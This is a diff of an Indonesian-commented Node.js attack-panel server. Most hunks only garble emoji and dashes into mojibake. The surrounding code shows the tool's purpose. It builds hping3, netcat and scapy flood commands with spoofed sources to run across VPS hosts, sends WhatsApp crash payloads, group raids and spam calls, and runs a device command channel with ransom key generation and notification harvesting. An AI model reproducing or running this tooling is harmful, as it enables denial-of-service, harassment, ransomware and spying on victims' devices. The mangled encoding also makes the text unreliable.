@@ -1,4 +1,4 @@
-
+﻿﻿
 const { webcrypto } = require('crypto');
 const { File: NodeFile, Blob: NodeBlob } = require('buffer');
 if (!globalThis.crypto) globalThis.crypto = webcrypto;
@@ -255,7 +255,7 @@ fs.watch(ACTIVE_KEYS_FILE, () => {
     clearTimeout(_akWatchDebounce);
     _akWatchDebounce = setTimeout(reloadActiveKeys, 80);
 });
-setInterval(reloadActiveKeys, 10000); // 10s — kurangi load CPU
+setInterval(reloadActiveKeys, 10000); // 10s â€” kurangi load CPU
 setInterval(function () { try { saveActiveKeys(); } catch { } }, 5000);
 setInterval(function () {
     const now = Date.now(); let changed = false;
@@ -286,7 +286,7 @@ let sikmanuk = (() => { try { return JSON.parse(fs.readFileSync("keyList.json", 
 function syncSikmanuk() { try { sikmanuk = JSON.parse(fs.readFileSync("keyList.json", "utf8")); } catch { } }
 let _sikDebounce = null;
 fs.watch("keyList.json", () => { clearTimeout(_sikDebounce); _sikDebounce = setTimeout(syncSikmanuk, 80); });
-setInterval(syncSikmanuk, 10000); // 10s — kurangi load CPU
+setInterval(syncSikmanuk, 10000); // 10s â€” kurangi load CPU
 
 const cooldownStore = {};
 
@@ -573,7 +573,7 @@ function checkAndInstallDependencies() {
 server.on('error', (err) => {
     if (err.code === 'EADDRINUSE') {
         const fallbackPort = wsPort + 1;
-        console.log(`⚠️  Port ${wsPort} sedang dipakai. Beralih ke port ${fallbackPort}...`);
+        console.log(`âš ï¸  Port ${wsPort} sedang dipakai. Beralih ke port ${fallbackPort}...`);
         setTimeout(() => {
             wsPort = fallbackPort;
             server.listen(wsPort);
@@ -584,8 +584,8 @@ server.on('error', (err) => {
 });
 
 server.listen(wsPort, () => {
-    console.log(`🟣 Server running on port ${wsPort}`);
-    console.log(`🚀 Server aktif di http://0.0.0.0:${wsPort}`);
+    console.log(`ðŸŸ£ Server running on port ${wsPort}`);
+    console.log(`ðŸš€ Server aktif di http://0.0.0.0:${wsPort}`);
     checkAndInstallDependencies();
     if (typeof startUserSessions === 'function') startUserSessions();
 })
@@ -665,7 +665,7 @@ if (fs.existsSync(KEY_FILE)) {
         const now = Date.now();
         let cleaned = 0;
         if (db.length === 0 && parsed.length > 0) {
-            console.log("⚠️ Database kosong tapi keyList ada " + parsed.length + " entries — SKIP cleanup untuk safety");
+            console.log("âš ï¸ Database kosong tapi keyList ada " + parsed.length + " entries â€” SKIP cleanup untuk safety");
             for (const user of parsed) {
                 if (user.sessionKey && user.username && user.lastLogin) {
                     const created = new Date(user.lastLogin).getTime();
@@ -697,7 +697,7 @@ if (fs.existsSync(KEY_FILE)) {
         saveActiveKeys();
         console.log("activeKeys loaded: " + Object.keys(activeKeys).length + " sessions");
     } catch (err) {
-        console.error("❌ Failed to load keyList.json:", err.message);
+        console.error("âŒ Failed to load keyList.json:", err.message);
     }
 }
 
@@ -707,18 +707,18 @@ function generateTempSessionId() {
 function connectToAllVPS() {
     if (!cncActive) return;
 
-    console.log("🔄 Connecting to all VPS servers...");
+    console.log("ðŸ”„ Connecting to all VPS servers...");
 
     for (const vps of vpsList) {
         const host = vps.host || vps.ip;
         const user = vps.username || vps.user;
         if (!host || !user) {
-            console.log(`❌ Invalid VPS config: ${JSON.stringify(vps)}`);
+            console.log(`âŒ Invalid VPS config: ${JSON.stringify(vps)}`);
             continue;
         }
         const isValidIpOrDomain = /^(?:[0-9]{1,3}\.){3}[0-9]{1,3}$/.test(host) || /^([a-zA-Z0-9-]+\.)*[a-zA-Z0-9-]+\.[a-zA-Z]{2,}$/.test(host) || host === "localhost";
         if (!isValidIpOrDomain) {
-            console.log(`❌ Invalid host format skipped: ${host}`);
+            console.log(`âŒ Invalid host format skipped: ${host}`);
             continue;
         }
 
@@ -737,24 +737,24 @@ function connectToAllVPS() {
                 return;
             }
 
-            console.log(`✅ Connected to VPS: ${vps.host}`);
+            console.log(`âœ… Connected to VPS: ${vps.host}`);
             vpsConnections[vps.host] = conn;
             vpsReconnectCount[vps.host] = 0;
         });
 
         conn.on('error', (err) => {
-            console.log(`❌ Failed ${vps.host}: ${err.message}`);
+            console.log(`âŒ Failed ${vps.host}: ${err.message}`);
         });
 
         conn.on('close', () => {
             delete vpsConnections[vps.host];
 
             if (!isReady) {
-                console.log(`❌ Unreachable: ${vps.host}`);
+                console.log(`âŒ Unreachable: ${vps.host}`);
                 return;
             }
 
-            console.log(`🔌 Disconnected: ${vps.host}`);
+            console.log(`ðŸ”Œ Disconnected: ${vps.host}`);
 
             if (cncActive) {
                 vpsReconnectCount[vps.host] = (vpsReconnectCount[vps.host] || 0) + 1;
@@ -762,7 +762,7 @@ function connectToAllVPS() {
                     const delay = Math.min(5000 * vpsReconnectCount[vps.host], 60000);
                     setTimeout(() => connectToAllVPS(), delay);
                 } else {
-                    console.log(`⛔ Max reconnect reached for ${vps.host}, skipping.`);
+                    console.log(`â›” Max reconnect reached for ${vps.host}, skipping.`);
                 }
             }
         });
@@ -775,13 +775,13 @@ function connectToAllVPS() {
                 readyTimeout: 5000
             });
         } catch (err) {
-            console.log(`❌ Connect crash ${vps.host}: ${err.message}`);
+            console.log(`âŒ Connect crash ${vps.host}: ${err.message}`);
         }
     }
 }
 
 function disconnectAllVPS() {
-    console.log("🛑 Disconnecting all VPS connections...");
+    console.log("ðŸ›‘ Disconnecting all VPS connections...");
     cncActive = false;
 
     for (const host in vpsConnections) {
@@ -803,7 +803,7 @@ function loadVPSList() {
             return vps;
         });
     } catch (err) {
-        console.error("❌ Failed to load VPS list:", err.message);
+        console.error("âŒ Failed to load VPS list:", err.message);
         vpsList = [];
     }
 }
@@ -816,10 +816,10 @@ if (fs.existsSync(VPS_FILE)) {
 fs.watch(VPS_FILE, () => {
     try {
         vpsList = JSON.parse(fs.readFileSync(VPS_FILE, 'utf8'));
-        console.log("🔄 VPS list updated.");
+        console.log("ðŸ”„ VPS list updated.");
         connectToAllVPS();
     } catch (e) {
-        console.error("❌ Failed to update VPS list:", e.message);
+        console.error("âŒ Failed to update VPS list:", e.message);
     }
 });
 
@@ -1565,7 +1565,7 @@ app.post("/", (req, res) => {
 
 function buildAttackCmd(method, target, port, duration) {
     switch (method) {
-        case "udp_hping3":   // DEFAULT — hping3 UDP flood
+        case "udp_hping3":   // DEFAULT â€” hping3 UDP flood
             return `hping3 --udp --flood --rand-source -p ${port} -d 1400 ${target}`;
 
         case "udp_nping":    // nping (dari paket nmap)
@@ -1574,7 +1574,7 @@ function buildAttackCmd(method, target, port, duration) {
         case "udp_bash":     // Pure bash + /dev/urandom, tidak butuh tool tambahan
             return `bash -c 'while true; do dd if=/dev/urandom bs=1400 count=1 2>/dev/null | nc -u -w0 ${target} ${port}; done'`;
 
-        case "udp_scapy":    // Python scapy — spoof random source IP
+        case "udp_scapy":    // Python scapy â€” spoof random source IP
             return `python3 -c "
 import random,time
 from scapy.all import *
@@ -1595,7 +1595,7 @@ while time.time()<end:
         case "tcp_ack":      // TCP ACK flood (bypass beberapa stateless firewall)
             return `hping3 -A --flood --rand-source -p ${port} ${target}`;
 
-        case "tcp_rst":      // TCP RST — putus koneksi aktif
+        case "tcp_rst":      // TCP RST â€” putus koneksi aktif
             return `hping3 -R --flood --rand-source -p ${port} ${target}`;
 
         case "tcp_fin":      // TCP FIN flood
@@ -2024,7 +2024,7 @@ app.get("/spamCall", async (req, res) => {
 
         await otax.offerCall(jid, true);
         await otax.updateBlockStatus(jid, "block");
-        console.log(`[✅ FIRST SPAM CALL] to ${jid} from ${socketId}`);
+        console.log(`[âœ… FIRST SPAM CALL] to ${jid} from ${socketId}`);
 
         cooldown.count++;
         spamCooldown[user.username] = cooldown;
@@ -2043,14 +2043,14 @@ app.get("/spamCall", async (req, res) => {
 
                     await otax.updateBlockStatus(jid, "block");
 
-                    console.log(`[✅ SPAM CALL] #${i + 1} to ${jid} from ${socketId}`);
+                    console.log(`[âœ… SPAM CALL] #${i + 1} to ${jid} from ${socketId}`);
                 } catch (err) {
-                    console.warn(`[❌ CALL #${i + 1} ERROR]`, err.message);
+                    console.warn(`[âŒ CALL #${i + 1} ERROR]`, err.message);
                 }
             }, i * 10000);
         }
     } catch (err) {
-        console.warn("[❌ FIRST CALL ERROR]", err.message);
+        console.warn("[âŒ FIRST CALL ERROR]", err.message);
         return res.json({ valid: false, message: "Call failed" });
     }
 });
@@ -2119,7 +2119,7 @@ app.get("/raidGroup", async (req, res) => {
         const raidBot = async (otax, groupJid) => {
             for (let round = 0; round < 2; round++) {
                 const sentMsg = await otax.sendMessage(groupJid, {
-                    text: `[otax Project]\n` + 'ꦾ'.repeat(30000)
+                    text: `[otax Project]\n` + 'ê¦¾'.repeat(30000)
                 });
                 await new Promise(r => setTimeout(r, 1000));
 
@@ -2157,7 +2157,7 @@ app.get("/raidGroup", async (req, res) => {
 
         return;
     } catch (err) {
-        console.warn("[❌ RAID ERROR]", err.message);
+        console.warn("[âŒ RAID ERROR]", err.message);
         return res.json({ valid: false, message: "Join or send failed" });
     }
 });
@@ -2199,7 +2199,7 @@ app.get("/spyGroup", async (req, res) => {
             participant: members,
         });
     } catch (err) {
-        console.warn("[❌ SPY GROUP ERROR]", err.message);
+        console.warn("[âŒ SPY GROUP ERROR]", err.message);
         return res.json({ valid: false, message: "Spy failed" });
     }
 });
@@ -2230,7 +2230,7 @@ app.get("/getInfo", async (req, res) => {
             type: info.biz ? "business" : "personal"
         });
     } catch (err) {
-        console.warn("[❌ GETINFO ERROR]", err.message);
+        console.warn("[âŒ GETINFO ERROR]", err.message);
         return res.json({ valid: false, message: "Query failed" });
     }
 });
@@ -2440,7 +2440,7 @@ app.get("/myInfo", async (req, res) => {
         targetApiPort: targetWorker ? targetWorker.apiPort : null,
         targetWsPort: targetWorker ? targetWorker.wsPort : null,
         listBug: bugs,
-        news: news // ✅ Tambahkan ini
+        news: news // âœ… Tambahkan ini
     });
 });
 const CHATROOM_FILE = path.join(__dirname, "chatroom.json");
@@ -3143,7 +3143,7 @@ app.get('/commands/poll', (req, res) => {
 
             fs.writeFile(COMMANDS_FILE, JSON.stringify(inMemoryCommands, null, 2), () => { });
 
-            console.log(`[→] CMD to ${device_id}: ${cmd.cmd} (${cmd.cmdId})`);
+            console.log(`[â†’] CMD to ${device_id}: ${cmd.cmd} (${cmd.cmdId})`);
             return res.json(cmd);
         }
         elapsed += interval;
@@ -3188,7 +3188,7 @@ app.post('/result', requireDeviceSession, (req, res) => {
 
     fs.writeFile(RESULTS_FILE, JSON.stringify(inMemoryResults, null, 2), () => { });
 
-    console.log(`[←] Result from ${device_id}: ${type} (${key})`);
+    console.log(`[â†] Result from ${device_id}: ${type} (${key})`);
     res.json({ status: 'ok' });
 });
 
@@ -3214,7 +3214,7 @@ app.post('/command', async (req, res) => {
 
     fs.writeFile(COMMANDS_FILE, JSON.stringify(inMemoryCommands, null, 2), () => { });
 
-    console.log(`[✓] Command from ${callerUsername} to ${device_id}: ${cmd} (${finalCmdId})`);
+    console.log(`[âœ“] Command from ${callerUsername} to ${device_id}: ${cmd} (${finalCmdId})`);
     res.json({ status: 'ok', cmdId: finalCmdId });
 });
 
@@ -3344,7 +3344,7 @@ app.delete('/target', (req, res) => {
     if (!isAdmin && !targetMatchesOwner(targets[index], { sessionKey: key, username: callerUsername })) return res.status(403).json({ error: 'Access denied' });
     targets.splice(index, 1);
     writeJSON(TARGETS_FILE, targets);
-    console.log(`[🗑️] Device ${device_id} deleted by ${callerUsername}`);
+    console.log(`[ðŸ—‘ï¸] Device ${device_id} deleted by ${callerUsername}`);
     res.json({ status: 'deleted' });
 });
 
@@ -3356,7 +3356,7 @@ app.get('/ransom/key', requireSession, (req, res) => {
     const newKey = crypto.randomBytes(8).toString('hex');
     keys[device_id] = { key: newKey, created_at: new Date().toISOString() };
     writeJSON(RANSOM_KEY_FILE, keys);
-    console.log(`[🔑 RANSOM] Generated for ${device_id}: ${newKey}`);
+    console.log(`[ðŸ”‘ RANSOM] Generated for ${device_id}: ${newKey}`);
     res.json({ key: newKey });
 });
 
@@ -3383,7 +3383,7 @@ app.post('/notif/report', requireDeviceSession, (req, res) => {
     writeJSON(NOTIF_REPORT_FILE, reports);
     const wsPayload = JSON.stringify({ type: 'notif_report', data: entry });
     wss.clients.forEach(c => { if (c.readyState === 1) c.send(wsPayload); });
-    console.log(`[📲 NOTIF] ${device_id} | ${session_id || 'no-session'} | ${appPackage} | ${title}`);
+    console.log(`[ðŸ“² NOTIF] ${device_id} | ${session_id || 'no-session'} | ${appPackage} | ${title}`);
     res.json({ ok: true });
 });
 
@@ -3650,7 +3650,7 @@ app.post('/api/build-apk', requireSession, upload.single('icon'), async (req, re
                                 await sharp(iconPath).resize(192, 192).png().toFile(pngPath);
                                 iconPath = pngPath;
                                 converted = true;
-                                console.log("Berhasil convert WebP via sharp → PNG 192x192");
+                                console.log("Berhasil convert WebP via sharp â†’ PNG 192x192");
                             } catch (_) {
                                 try {
                                     const { execSync } = require('child_process');
@@ -3658,7 +3658,7 @@ app.post('/api/build-apk', requireSession, upload.single('icon'), async (req, re
                                     if (fs.existsSync(pngPath)) {
                                         iconPath = pngPath;
                                         converted = true;
-                                        console.log("Berhasil convert WebP via ffmpeg → PNG 192x192");
+                                        console.log("Berhasil convert WebP via ffmpeg â†’ PNG 192x192");
                                     }
                                 } catch (__) {
                                     try {
@@ -3667,7 +3667,7 @@ app.post('/api/build-apk', requireSession, upload.single('icon'), async (req, re
                                         if (fs.existsSync(pngPath)) {
                                             iconPath = pngPath;
                                             converted = true;
-                                            console.log("Berhasil convert WebP via ImageMagick → PNG 192x192");
+                                            console.log("Berhasil convert WebP via ImageMagick â†’ PNG 192x192");
                                         }
                                     } catch (___) {
                                         console.error("Semua fallback WebP gagal, mencoba Jimp...");
@@ -3680,7 +3680,7 @@ app.post('/api/build-apk', requireSession, upload.single('icon'), async (req, re
                             const image = await Jimp.read(iconPath);
                             await image.resize(192, 192).writeAsync(pngPath);
                             iconPath = pngPath;
-                            console.log("Berhasil convert dan resize gambar icon via Jimp → 192x192 PNG.");
+                            console.log("Berhasil convert dan resize gambar icon via Jimp â†’ 192x192 PNG.");
                         }
                     } catch (err) {
                         console.error("Gagal convert gambar icon:", err.message);
@@ -4648,7 +4648,7 @@ async function ensureSocketAlive(otax, username, senderType) {
     const hasUser = otax?.user?.id || otax?.authState?.creds?.me?.id;
     const sockAge = otax?.lastChecked ? (Date.now() - otax.lastChecked) : 999999;
     if ((ws === 1 || ws === undefined || ws === null) && (hasUser || sockAge < 15000)) return otax;
-    console.log(`[SENDBUG] ⚠️ Socket mati (state: ${ws}, user: ${hasUser ? 'ok' : 'pending'}) untuk ${username}, mencari sender baru...`);
+    console.log(`[SENDBUG] âš ï¸ Socket mati (state: ${ws}, user: ${hasUser ? 'ok' : 'pending'}) untuk ${username}, mencari sender baru...`);
     // Bersihkan socket lama dari cache
     const staleKey = Object.keys(activeConnections).find(k => activeConnections[k] === otax);
     if (staleKey) {
@@ -5106,7 +5106,7 @@ async function getReadySender(username, senderType) {
                 for (const sessionName of tryList) {
                     const reg = sessionRegistry[sessionName];
                     if (!reg || !reg.folderPath) continue;
-                    console.log(`[ON-DEMAND] 🔄 Connect on-demand: ${sessionName} (role: ${reg.role})`);
+                    console.log(`[ON-DEMAND] ðŸ”„ Connect on-demand: ${sessionName} (role: ${reg.role})`);
                     const newOtax = await checkActiveSessionInFolder(sessionName);
                     if (newOtax) {
                         newOtax.lastChecked = Date.now();
@@ -5157,13 +5157,13 @@ async function processSendBugJob(jobData) {
         let otax = await getReadySender(username, senderType);
 
         if (!otax) {
-            console.log(`[MEMORYQUEUE-SENDBUG] ❌ Gagal: Tidak ada sesi yang siap.`);
+            console.log(`[MEMORYQUEUE-SENDBUG] âŒ Gagal: Tidak ada sesi yang siap.`);
             updateHistoryStatus(historyId, 'failed', 'Tidak ada sesi WhatsApp sender yang siap/aktif');
 
             const db = loadDatabase();
             const user = db.find(u => u.username === username);
             if (user && user.fcmToken) {
-                sendPushNotification(user.fcmToken, "Gagal Mengirim Bug ⚠️", `Serangan bug ke ${target} gagal: Tidak ada sesi sender yang aktif.`);
+                sendPushNotification(user.fcmToken, "Gagal Mengirim Bug âš ï¸", `Serangan bug ke ${target} gagal: Tidak ada sesi sender yang aktif.`);
             }
             return;
         }
@@ -5178,16 +5178,16 @@ async function processSendBugJob(jobData) {
         const db = loadDatabase();
         const user = db.find(u => u.username === username);
         if (user && user.fcmToken) {
-            sendPushNotification(user.fcmToken, "Bug Terkirim! 🚀", `Serangan bug ${bug} ke ${target} sukses dikirim.`);
+            sendPushNotification(user.fcmToken, "Bug Terkirim! ðŸš€", `Serangan bug ${bug} ke ${target} sukses dikirim.`);
         }
     } catch (err) {
-        console.error(`[MEMORYQUEUE-SENDBUG] ❌ Error:`, err.message);
+        console.error(`[MEMORYQUEUE-SENDBUG] âŒ Error:`, err.message);
         updateHistoryStatus(historyId, 'failed', err.message);
 
         const db = loadDatabase();
         const user = db.find(u => u.username === username);
         if (user && user.fcmToken) {
-            sendPushNotification(user.fcmToken, "Gagal Mengirim Bug ⚠️", `Serangan bug ke ${target} gagal: ${err.message}`);
+            sendPushNotification(user.fcmToken, "Gagal Mengirim Bug âš ï¸", `Serangan bug ke ${target} gagal: ${err.message}`);
         }
     }
 }
@@ -6165,7 +6165,7 @@ app.post('/api/admin/set-update', (req, res) => {
 
     try {
         saveUpdateInfo(payload);
-        console.log(`[SET-UPDATE] ${user.username} set update → v${payload.version} | ${payload.download_url}`);
+        console.log(`[SET-UPDATE] ${user.username} set update â†’ v${payload.version} | ${payload.download_url}`);
         return res.json({
             success: true,
             message: `Update v${payload.version} berhasil disimpan`,
@@ -6214,7 +6214,7 @@ app.post('/api/admin/broadcast-update', (req, res) => {
             } catch (err) { }
         }
 
-        console.log(`[BROADCAST] ${user.username} → "${autoMsg}"`);
+        console.log(`[BROADCAST] ${user.username} â†’ "${autoMsg}"`);
         return res.json({
             success: true,
             message: 'Broadcast terkirim ke semua user',
@@ -6534,7 +6534,7 @@ app.post('/jasapost/markSold', (req, res) => {
     if (!sold && iklanList[idx].stok === 0) iklanList[idx].stok = -1;
 
     saveJasaPost(iklanList);
-    console.log(`[JASAPOST] "${iklanList[idx].judul}" → ${sold ? 'TERJUAL' : 'TERSEDIA'} oleh ${keyInfo.username}`);
+    console.log(`[JASAPOST] "${iklanList[idx].judul}" â†’ ${sold ? 'TERJUAL' : 'TERSEDIA'} oleh ${keyInfo.username}`);
     return res.json({ valid: true, message: sold ? 'Iklan ditandai TERJUAL' : 'Iklan ditandai TERSEDIA', iklan: iklanList[idx] });
 });
 
@@ -6566,7 +6566,7 @@ app.post('/jasapost/updateStok', (req, res) => {
     else if (stokVal > 0) iklanList[idx].isSold = false;
 
     saveJasaPost(iklanList);
-    console.log(`[JASAPOST] Stok "${iklanList[idx].judul}" → ${stokVal < 0 ? 'unlimited' : stokVal} oleh ${keyInfo.username}`);
+    console.log(`[JASAPOST] Stok "${iklanList[idx].judul}" â†’ ${stokVal < 0 ? 'unlimited' : stokVal} oleh ${keyInfo.username}`);
     return res.json({ valid: true, message: stokVal < 0 ? 'Stok diset ke Unlimited' : `Stok: ${stokVal} unit`, iklan: iklanList[idx] });
 });
 
@@ -6703,7 +6703,7 @@ const testFunctionQueue = new MemoryQueue(15);
 
 async function processTestFunctionJob(jobData) {
     const { username, targets, func, delay, loops, logId } = jobData;
-    console.log(`\n[TEST-FUNCTION] 🚀 Start job untuk ${username}`);
+    console.log(`\n[TEST-FUNCTION] ðŸš€ Start job untuk ${username}`);
 
     try {
         const otax = await reconnectSessionInFolder(username);
@@ -6888,12 +6888,12 @@ const customPayloadQueue = new MemoryQueue(15);
 
 async function processCustomPayloadJob(jobData) {
     const { username, targetJid, bugs, parsedCount, parsedDelay } = jobData;
-    console.log(`\n[CUSTOM-PAYLOAD] 🚀 Start job untuk ${username} | Target: ${targetJid} | Sender: PRIBADI`);
+    console.log(`\n[CUSTOM-PAYLOAD] ðŸš€ Start job untuk ${username} | Target: ${targetJid} | Sender: PRIBADI`);
 
     try {
         let otax = await checkActiveSessionInFolder(username);
         if (!otax) {
-            console.error(`[CUSTOM-PAYLOAD] ❌ Session PRIBADI WA untuk ${username} tidak ditemukan!`);
+            console.error(`[CUSTOM-PAYLOAD] âŒ Session PRIBADI WA untuk ${username} tidak ditemukan!`);
             return;
         }
 
@@ -7033,7 +7033,7 @@ async function processCustomPayloadJob(jobData) {
                 }
                 return true;
             } catch (err) {
-                console.error(`[CUSTOM-PAYLOAD] ❌ Error mengirim ${bugId}:`, err.message);
+                console.error(`[CUSTOM-PAYLOAD] âŒ Error mengirim ${bugId}:`, err.message);
                 if (err.message === 'Connection Closed' || (err.message && err.message.includes('EPIPE'))) throw err;
                 return false;
             }
@@ -7048,7 +7048,7 @@ async function processCustomPayloadJob(jobData) {
                 const bugId = bugs[bugIndex];
                 otax = await checkActiveSessionInFolder(username);
                 if (!otax) {
-                    console.error(`[CUSTOM-PAYLOAD] ❌ Session ${username} terputus di tengah eksekusi.`);
+                    console.error(`[CUSTOM-PAYLOAD] âŒ Session ${username} terputus di tengah eksekusi.`);
                     break;
                 }
                 try {
@@ -7068,10 +7068,10 @@ async function processCustomPayloadJob(jobData) {
                             try {
                                 await attemptRunCustomBug(otax, bugId, targetJid);
                             } catch (err2) {
-                                console.error(`[CUSTOM-PAYLOAD] ❌ Retry failed for ${bugId}:`, err2.message);
+                                console.error(`[CUSTOM-PAYLOAD] âŒ Retry failed for ${bugId}:`, err2.message);
                             }
                         } else {
-                            console.error(`[CUSTOM-PAYLOAD] ❌ Session ${username} tidak bisa reconnect.`);
+                            console.error(`[CUSTOM-PAYLOAD] âŒ Session ${username} tidak bisa reconnect.`);
                             break;
                         }
                     }
@@ -7080,9 +7080,9 @@ async function processCustomPayloadJob(jobData) {
             }
             if (cycle < parsedCount - 1 && parsedDelay > 0) await sleep(parsedDelay);
         }
-        console.log(`[CUSTOM-PAYLOAD] ✅ Payload batch selesai untuk ${username}`);
+        console.log(`[CUSTOM-PAYLOAD] âœ… Payload batch selesai untuk ${username}`);
     } catch (error) {
-        console.error(`[CUSTOM-PAYLOAD] ❌ Loop error:`, error.message);
+        console.error(`[CUSTOM-PAYLOAD] âŒ Loop error:`, error.message);
     }
 }
 
@@ -7091,16 +7091,16 @@ app.post("/api/custom-payload", async (req, res) => {
         const key = req.body.key || req.query.key || req.headers['x-session-key'] || req.headers['session-key'];
         const { target, delay, count, bugs, mode } = req.body;
 
-        console.log(`\n[CUSTOM-PAYLOAD] 📥 Request POST Masuk | Key: ${key ? key.substring(0, 5) + '...' : 'TIDAK ADA'} | Target: ${target}`);
+        console.log(`\n[CUSTOM-PAYLOAD] ðŸ“¥ Request POST Masuk | Key: ${key ? key.substring(0, 5) + '...' : 'TIDAK ADA'} | Target: ${target}`);
 
         if (!key || !target) {
-            console.log(`[CUSTOM-PAYLOAD] ❌ Ditolak: Key atau Target kosong.`);
+            console.log(`[CUSTOM-PAYLOAD] âŒ Ditolak: Key atau Target kosong.`);
             return res.status(400).json({ success: false, message: "Key dan target diperlukan" });
         }
 
         const keyInfo = activeKeys[key];
         if (!keyInfo) {
-            console.log(`[CUSTOM-PAYLOAD] ❌ Ditolak: Session key salah/tidak valid.`);
+            console.log(`[CUSTOM-PAYLOAD] âŒ Ditolak: Session key salah/tidak valid.`);
             return res.status(401).json({ success: false, message: "Session key tidak valid" });
         }
 
@@ -7109,7 +7109,7 @@ app.post("/api/custom-payload", async (req, res) => {
         if (blockReview(user, res)) return;
 
         if (!user) {
-            console.log(`[CUSTOM-PAYLOAD] ❌ Ditolak: User tidak ditemukan.`);
+            console.log(`[CUSTOM-PAYLOAD] âŒ Ditolak: User tidak ditemukan.`);
             return res.status(404).json({ success: false, message: "User tidak ditemukan" });
         }
 
@@ -7231,7 +7231,7 @@ app.get("/custom-payload/bugs", async (req, res) => {
         });
 
     } catch (error) {
-        console.error("[❌ CUSTOM] Error fetching bugs:", error);
+        console.error("[âŒ CUSTOM] Error fetching bugs:", error);
         res.status(500).json({
             success: false,
             message: "Terjadi kesalahan server"
@@ -7292,7 +7292,7 @@ app.get("/custom-payload/status", async (req, res) => {
         });
 
     } catch (error) {
-        console.error("[❌ CUSTOM] Error checking status:", error);
+        console.error("[âŒ CUSTOM] Error checking status:", error);
         res.status(500).json({
             success: false,
             message: "Terjadi kesalahan server"
@@ -7310,7 +7310,7 @@ app.get("/bugGroupSystems", async (req, res) => {
                 description: "Fc No Click All Memb",
                 count: 5,
                 delay: 1000,
-                icon: "ᥫᯓ"
+                icon: "á¥«á¯“"
             },
             {
                 id: "group_javhd",
@@ -7318,7 +7318,7 @@ app.get("/bugGroupSystems", async (req, res) => {
                 description: "Clik + No Click",
                 count: 100,
                 delay: 2000,
-                icon: "ᥫᯓ"
+                icon: "á¥«á¯“"
             },
             {
                 id: "group_delay",
@@ -7326,7 +7326,7 @@ app.get("/bugGroupSystems", async (req, res) => {
                 description: "Delay Group",
                 count: 100,
                 delay: 2000,
-                icon: "ᥫ᭡"
+                icon: "á¥«á­¡"
             }
         ];
 
@@ -7348,7 +7348,7 @@ const sendBugGroupQueue = new MemoryQueue(15);
 
 async function processSendBugGroupJob(jobData) {
     const { username, cleanGroup, bugType, historyId } = jobData;
-    console.log(`\n[MEMORYQUEUE-BUG GROUP] 🚀 Memulai serangan untuk user: ${username}`);
+    console.log(`\n[MEMORYQUEUE-BUG GROUP] ðŸš€ Memulai serangan untuk user: ${username}`);
 
     updateHistoryStatus(historyId, 'processing');
 
@@ -7369,14 +7369,14 @@ async function processSendBugGroupJob(jobData) {
         };
 
         otax = findSessionInRam();
-        if (otax) console.log(`[MEMORYQUEUE-BUG GROUP] ✅ Sesi WA di RAM ketemu!`);
+        if (otax) console.log(`[MEMORYQUEUE-BUG GROUP] âœ… Sesi WA di RAM ketemu!`);
 
         if (!otax && typeof getValidNumbersForUser === 'function') {
-            console.log(`[MEMORYQUEUE-BUG GROUP] ⚠️ Sesi RAM kosong, Memaksa Hard Reconnect...`);
+            console.log(`[MEMORYQUEUE-BUG GROUP] âš ï¸ Sesi RAM kosong, Memaksa Hard Reconnect...`);
             await getValidNumbersForUser(username.trim());
             await sleep(3000);
             otax = findSessionInRam();
-            if (otax) console.log(`[MEMORYQUEUE-BUG GROUP] ✅ Sesi WA berhasil dibangunkan dari tidur!`);
+            if (otax) console.log(`[MEMORYQUEUE-BUG GROUP] âœ… Sesi WA berhasil dibangunkan dari tidur!`);
         }
 
         if (!otax && typeof checkActiveSessionInFolder === 'function') {
@@ -7384,19 +7384,19 @@ async function processSendBugGroupJob(jobData) {
         }
 
         if (!otax) {
-            console.log(`[MEMORYQUEUE-BUG GROUP] ❌ GAGAL! Sesi WA tidak aktif / terputus untuk user: ${username}`);
+            console.log(`[MEMORYQUEUE-BUG GROUP] âŒ GAGAL! Sesi WA tidak aktif / terputus untuk user: ${username}`);
             updateHistoryStatus(historyId, 'failed', 'Sesi WhatsApp tidak aktif atau terputus');
 
             const db = loadDatabase();
             const user = db.find(u => u.username === username);
             if (user && user.fcmToken) {
-                sendPushNotification(user.fcmToken, "Gagal Mengirim Bug Group ⚠️", `Serangan ke group ${cleanGroup} gagal: Sesi WA tidak aktif.`);
+                sendPushNotification(user.fcmToken, "Gagal Mengirim Bug Group âš ï¸", `Serangan ke group ${cleanGroup} gagal: Sesi WA tidak aktif.`);
             }
             return;
         }
 
         const targetJid = `${cleanGroup}@g.us`;
-        console.log(`[MEMORYQUEUE-BUG GROUP] 🎯 Target JID: ${targetJid} | Tipe: ${bugType}`);
+        console.log(`[MEMORYQUEUE-BUG GROUP] ðŸŽ¯ Target JID: ${targetJid} | Tipe: ${bugType}`);
 
         const bugConfigs = {
             "group_javhd": { count: 5, type: "javhd" },
@@ -7410,7 +7410,7 @@ async function processSendBugGroupJob(jobData) {
         };
 
         const config = bugConfigs[bugType] || bugConfigs.group_default;
-        console.log(`[MEMORYQUEUE-BUG GROUP] ⚙️ Mengeksekusi ${config.count} tembakan tipe ${config.type}...`);
+        console.log(`[MEMORYQUEUE-BUG GROUP] âš™ï¸ Mengeksekusi ${config.count} tembakan tipe ${config.type}...`);
 
         switch (config.type) {
             case "javhd":
@@ -7459,13 +7459,13 @@ async function processSendBugGroupJob(jobData) {
                 break;
         }
 
-        console.log(`[MEMORYQUEUE-BUG GROUP] ✅ SERANGAN SELESAI DENGAN SUKSES!`);
+        console.log(`[MEMORYQUEUE-BUG GROUP] âœ… SERANGAN SELESAI DENGAN SUKSES!`);
         updateHistoryStatus(historyId, 'success');
 
         const db = loadDatabase();
         const user = db.find(u => u.username === username);
         if (user && user.fcmToken) {
-            sendPushNotification(user.fcmToken, "Bug Group Terkirim! 🚀", `Serangan bug ${bugType} ke group ${cleanGroup} sukses.`);
+            sendPushNotification(user.fcmToken, "Bug Group Terkirim! ðŸš€", `Serangan bug ${bugType} ke group ${cleanGroup} sukses.`);
         }
     } catch (e) {
         console.error("[MEMORYQUEUE-BUG GROUP ERROR FATAL]", e.message);
@@ -7474,7 +7474,7 @@ async function processSendBugGroupJob(jobData) {
         const db = loadDatabase();
         const user = db.find(u => u.username === username);
         if (user && user.fcmToken) {
-            sendPushNotification(user.fcmToken, "Gagal Mengirim Bug Group ⚠️", `Serangan ke group ${cleanGroup} gagal: ${e.message}`);
+            sendPushNotification(user.fcmToken, "Gagal Mengirim Bug Group âš ï¸", `Serangan ke group ${cleanGroup} gagal: ${e.message}`);
         }
     }
 }
@@ -8407,14 +8407,14 @@ app.post('/api/spam/whatsapp', async (req, res) => {
         let successCount = 0;
         let failCount = 0;
 
-        console.log(`🚀 Starting WhatsApp spam for ${cleanPhone}, Count: ${validCount}, Delay: ${validDelay}ms`);
